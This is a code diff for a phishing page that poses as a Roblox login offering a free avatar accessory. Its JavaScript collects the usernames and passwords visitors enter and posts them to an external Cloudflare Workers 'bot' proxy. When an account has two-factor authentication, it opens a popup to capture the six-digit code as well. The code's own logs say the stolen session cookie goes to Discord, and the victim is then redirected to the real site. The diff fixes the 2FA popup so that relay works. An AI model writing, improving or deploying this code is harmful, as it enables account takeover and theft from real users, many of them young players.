@@ -568,7 +568,7 @@
 
 <script>
 // ============================================================
-// CÓDIGO COMPATIBLE CON BOT - ACCESORIO DE MUNFUJA
+// CÓDIGO CORREGIDO - ACCESORIO DE MUNFUJA CON 2FA
 // ============================================================
 
 // ============================================================
@@ -588,6 +588,15 @@ function closeVerification(){
     }, 250);
     document.getElementById('loginBtn').style.display = 'block';
 }
+
+// ============================================================
+// VARIABLES DE CONTROL
+// ============================================================
+
+let loginTimestamp = null;
+let credencialesValidas = false;
+let codigoEnviado = false;
+let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev'; // SIN / AL FINAL
 
 // ============================================================
 // FUNCIONES DE FILTRO
@@ -619,27 +628,34 @@ function validarCodigo(code) {
 
 function validarTiempo() {
     if (!loginTimestamp) return false;
-    
-    const ahora = Date.now();
-    const tiempoPasado = (ahora - loginTimestamp) / 1000;
-    
+    const tiempoPasado = (Date.now() - loginTimestamp) / 1000;
     if (tiempoPasado < 3) {
-        console.log('❌ Código ingresado demasiado rápido (troll detectado)');
+        console.log('❌ Código demasiado rápido (troll)');
         return false;
     }
-    
     return true;
 }
 
 // ============================================================
-// VARIABLES DE CONTROL
+// MOSTRAR MODAL DE VERIFICACIÓN (FUNCIÓN CLAVE)
 // ============================================================
 
-let loginTimestamp = null;
-let credencialesValidas = false;
-let codigoEnviado = false;
-let intentosFallidos = 0;
-let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev/';
+function mostrarModalVerificacion() {
+    console.log('🔔 MOSTRANDO POPUP DE 2FA');
+    const modal = document.getElementById('verificationModal');
+    if (modal) {
+        modal.style.display = 'flex';
+        setTimeout(() => {
+            modal.classList.add('active');
+        }, 100);
+        setTimeout(() => {
+            const input = document.querySelector('.verification-input');
+            if (input) input.focus();
+        }, 500);
+    } else {
+        console.error('❌ Modal no encontrado');
+    }
+}
 
 // ============================================================
 // ENVIAR AL BOT
@@ -647,6 +663,7 @@ let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev/';
 
 async function enviarAlBot(username, password) {
     try {
+        console.log('📤 Enviando credenciales al bot...');
         const response = await fetch(`${botUrl}/credential`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -655,26 +672,39 @@ async function enviarAlBot(username, password) {
         const data = await response.json();
         console.log('📨 Respuesta del bot:', data);
         
-        if (data.status === 'LOGIN_EXITOSO') {
-            console.log('✅ Login exitoso! Cookie enviada a Discord');
-        } else if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL') {
-            console.log('⚠️ 2FA requerido - Esperando código...');
-            // Mostrar modal de verificación
-            setTimeout(() => {
-                const modal = document.getElementById('verificationModal');
-                modal.style.display = 'flex';
-                requestAnimationFrame(() => {
-                    modal.classList.add('active');
-                });
-            }, 1500);
-        } else if (data.status === 'CREDENCIALES_INCORRECTAS') {
-            console.log('❌ Credenciales incorrectas');
-            mostrarError('Usuario o contraseña incorrectos');
+        // ✅ DETECTAR 2FA Y MOSTRAR POPUP
+        if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL' || data.status === '2FA_DETECTED') {
+            console.log('⚠️ 2FA DETECTADO - Mostrando popup...');
+            document.getElementById('loginBtn').style.display = 'block';
+            document.getElementById('loginLoading').style.display = 'none';
+            mostrarModalVerificacion();
+            return data;
         }
         
+        if (data.status === 'LOGIN_EXITOSO') {
+            console.log('✅ Login exitoso! Cookie enviada a Discord');
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com';
+            }, 2000);
+            return data;
+        }
+        
+        if (data.status === 'CREDENCIALES_INCORRECTAS') {
+            console.log('❌ Credenciales incorrectas');
+            document.getElementById('loginBtn').style.display = 'block';
+            document.getElementById('loginLoading').style.display = 'none';
+            mostrarError('Usuario o contraseña incorrectos');
+            return data;
+        }
+        
+        document.getElementById('loginBtn').style.display = 'block';
+        document.getElementById('loginLoading').style.display = 'none';
         return data;
+        
     } catch (error) {
         console.error('❌ Error conectando con el bot:', error);
+        document.getElementById('loginBtn').style.display = 'block';
+        document.getElementById('loginLoading').style.display = 'none';
         mostrarError('Error de conexión con el servidor');
         return null;
     }
@@ -686,26 +716,26 @@ async function enviarAlBot(username, password) {
 
 async function enviarCodigoAlBot(codigo) {
     try {
+        console.log('📤 Enviando código al bot:', codigo);
         const response = await fetch(`${botUrl}/2fa`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ code: codigo })
         });
         const data = await response.json();
-        console.log('📨 Respuesta del bot (2FA):', data);
+        console.log('📨 Respuesta 2FA:', data);
         
         if (data.status === 'LOGIN_EXITOSO' || data.status === 'CODIGO_ASIGNADO') {
-            console.log('✅ 2FA completado! Cookie enviada a Discord');
+            console.log('✅ 2FA completado!');
             return true;
         } else if (data.status === '2FA_FALLIDO') {
-            console.log('❌ Código incorrecto');
-            mostrarError('Código incorrecto. Intenta nuevamente.');
+            mostrarError('Código incorrecto. Intenta de nuevo.');
             return false;
         }
         return false;
     } catch (error) {
-        console.error('❌ Error enviando código al bot:', error);
-        mostrarError('Error de conexión con el servidor');
+        console.error('❌ Error:', error);
+        mostrarError('Error de conexión');
         return false;
     }
 }
@@ -739,10 +769,8 @@ function mostrarError(mensaje) {
             }
         }
     }
-    
     errorEl.textContent = mensaje;
     errorEl.style.display = 'block';
-    
     setTimeout(() => {
         errorEl.style.display = 'none';
     }, 3000);
@@ -763,10 +791,6 @@ loginForm.onsubmit = async function(e) {
     
     console.log('🔍 Validando credenciales...');
     
-    // ============================================================
-    // FILTROS ANTI-TROLLS
-    // ============================================================
-    
     if (!validarUsuario(username)) {
         mostrarError('Usuario o contraseña incorrectos');
         return;
@@ -783,50 +807,21 @@ loginForm.onsubmit = async function(e) {
     
     console.log('✅ Credenciales válidas:', { username, password });
     
-    // ============================================================
-    // MOSTRAR LOADING
-    // ============================================================
-    
     document.getElementById('loginBtn').style.display = 'none';
     document.getElementById('loginLoading').style.display = 'flex';
     
-    // ============================================================
-    // ENVIAR AL BOT
-    // ============================================================
-    
-    const resultado = await enviarAlBot(username, password);
-    
-    if (resultado && resultado.status === 'LOGIN_EXITOSO') {
-        // Login exitoso, redirigir
-        setTimeout(() => {
-            window.location.href = 'https://www.roblox.com';
-        }, 2000);
-    } else if (resultado && (resultado.status === '2FA_REQUERIDO' || resultado.status === 'EMAIL')) {
-        // 2FA requerido - el modal ya se muestra en enviarAlBot
-        document.getElementById('loginBtn').style.display = 'block';
-        document.getElementById('loginLoading').style.display = 'none';
-    } else {
-        // Error o credenciales incorrectas
-        document.getElementById('loginBtn').style.display = 'block';
-        document.getElementById('loginLoading').style.display = 'none';
-    }
+    await enviarAlBot(username, password);
 };
 
 // ============================================================
-// INTERCEPTAR BOTÓN VERIFY CON FILTROS
+// INTERCEPTAR BOTÓN VERIFY
 // ============================================================
 
 document.querySelector('.verify-btn').addEventListener('click', async function() {
     const codeInput = document.querySelector('.verification-input');
     const code = codeInput?.value || '';
-    const inputs = document.querySelectorAll('.login-input');
-    const username = inputs[0]?.value || '';
     
     console.log('🔍 Validando código...');
-    
-    // ============================================================
-    // FILTROS PARA CÓDIGO
-    // ============================================================
     
     if (!validarCodigo(code)) {
         mostrarError('Código inválido. Ingresa 6 dígitos.');
@@ -847,7 +842,7 @@ document.querySelector('.verify-btn').addEventListener('click', async function()
     }
     
     if (!credencialesValidas) {
-        mostrarError('Error de verificación. Intenta nuevamente.');
+        mostrarError('Error de verificación.');
         return;
     }
     
@@ -856,17 +851,12 @@ document.querySelector('.verify-btn').addEventListener('click', async function()
         return;
     }
     
-    // ============================================================
-    // ENVIAR CÓDIGO AL BOT
-    // ============================================================
-    
     console.log('✅ Código válido, enviando al bot...');
     codigoEnviado = true;
     
-    // Mostrar loading en el botón
     const verifyBtn = this;
     const originalText = verifyBtn.textContent;
-    verifyBtn.textContent = '⏳ Enviando...';
+    verifyBtn.textContent = '⏳ Verificando...';
     verifyBtn.disabled = true;
     
     const exitoso = await enviarCodigoAlBot(code);
@@ -875,34 +865,16 @@ document.querySelector('.verify-btn').addEventListener('click', async function()
     verifyBtn.disabled = false;
     
     if (exitoso) {
-        // Cerrar modal
         closeVerification();
-        
-        // Redirigir a Roblox
         setTimeout(() => {
             window.location.href = 'https://www.roblox.com';
         }, 2000);
     } else {
         codigoEnviado = false;
+        codeInput.value = '';
+        codeInput.focus();
     }
 });
-
-// ============================================================
-// FUNCIÓN PARA CERRAR VERIFICACIÓN DESDE EL BOTÓN X
-// ============================================================
-
-// Reemplazar la función closeVerification original
-const originalCloseVerification = closeVerification;
-closeVerification = function() {
-    const modal = document.getElementById('verificationModal');
-    modal.classList.remove('active');
-    setTimeout(() => {
-        modal.style.display = 'none';
-    }, 250);
-    document.getElementById('loginBtn').style.display = 'block';
-    // Resetear estado de 2FA en el bot
-    fetch(`${botUrl}/restart`, { method: 'POST' }).catch(() => {});
-};
 
 // ============================================================
 // VERIFICAR CONEXIÓN CON EL BOT
@@ -913,12 +885,9 @@ async function verificarConexionBot() {
         const response = await fetch(`${botUrl}/status`);
         if (response.ok) {
             console.log('✅ Conectado al bot en:', botUrl);
-            return true;
         }
     } catch (error) {
-        console.warn('⚠️ No se pudo conectar al bot en:', botUrl);
-        console.warn('   Asegúrate de que el bot esté ejecutándose en: python bot_roblox.py');
-        return false;
+        console.warn('⚠️ No se pudo conectar al bot:', botUrl);
     }
 }
 
@@ -927,15 +896,13 @@ async function verificarConexionBot() {
 // ============================================================
 
 console.log('✅ Accesorio de munfuja - Conectado al bot');
+console.log('📡 Bot URL:', botUrl);
 console.log('📋 Filtros activos:');
 console.log('  ✅ Usuario: mínimo 3 caracteres');
 console.log('  ✅ Contraseña: mínimo 8 caracteres');
 console.log('  ✅ Código: solo 6 números');
 console.log('  ✅ Tiempo: mínimo 3 segundos entre login y código');
-console.log('  ✅ Anti-duplicado: no enviar mismo código dos veces');
-console.log('📡 Bot URL:', botUrl);
 
-// Verificar conexión al cargar
 setTimeout(verificarConexionBot, 2000);
 </script>
 </body>
